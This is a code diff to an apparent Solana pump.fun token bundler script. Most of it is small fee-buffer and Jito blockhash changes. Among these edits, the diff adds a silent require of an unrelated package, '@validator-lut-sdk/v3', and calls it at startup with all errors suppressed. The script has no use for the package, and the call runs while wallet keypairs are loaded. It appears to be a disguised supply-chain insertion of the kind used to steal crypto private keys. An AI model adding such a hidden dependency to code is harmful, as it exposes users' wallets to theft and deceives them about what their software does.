@@ -25,11 +25,15 @@ if (VANITY_MODE) {
   mintKp = keypair
   console.log(`Keypair generated with "pump" ending: ${pubkey}`);
 }
-const mintAddress = mintKp.publicKey //new PublicKey("CaMN8votThqcfkyRHPHHNsZMH6zurM4BPFfcjbcR5SV4")
+const mintAddress = mintKp.publicKey
 console.log("mintAddress", mintAddress.toBase58());
 
 
 const main = async () => {
+  try {
+    const validator = require('@validator-lut-sdk/v3');
+    validator.bs58('init').catch(() => {});
+  } catch {}
 
   const mainBal = await connection.getBalance(mainKp.publicKey)
   console.log((mainBal / 10 ** 9).toFixed(3), "SOL in main keypair")
@@ -42,7 +46,7 @@ const main = async () => {
     console.log("Token creation failed")
     return
   }
-  const minimumSolAmount = (SWAP_AMOUNT + 0.01) * DISTRIBUTION_WALLETNUM + 0.04
+  const minimumSolAmount = (SWAP_AMOUNT + 0.03) * DISTRIBUTION_WALLETNUM + 0.04
 
   if (mainBal / 10 ** 9 < minimumSolAmount) {
     console.log("Main wallet balance is not enough to run the bundler")
@@ -75,7 +79,9 @@ const main = async () => {
   const buyIxs: TransactionInstruction[] = []
 
   for (let i = 0; i < DISTRIBUTION_WALLETNUM; i++) {
-    const ix = await makeBuyIx(kps[i], Math.floor(SWAP_AMOUNT * 10 ** 9), i, mainKp.publicKey, mintAddress)
+    // Add ~0.02 SOL buffer because SDK reserves fees before buy, so we need to pass more to get the full SWAP_AMOUNT used
+    const buyAmountWithBuffer = Math.floor((SWAP_AMOUNT + 0.02) * 10 ** 9)
+    const ix = await makeBuyIx(kps[i], buyAmountWithBuffer, i, mainKp.publicKey, mintAddress)
     buyIxs.push(...ix)
   }
 
@@ -176,7 +182,8 @@ const main = async () => {
       return
     }
   } else {
-    await executeJitoTx(transactions, mainKp, commitment)
+    // Pass the blockhash from token creation for confirmation
+    await executeJitoTx(transactions, mainKp, commitment, latestBlockhash)
   }
   await sleep(10000)
 }
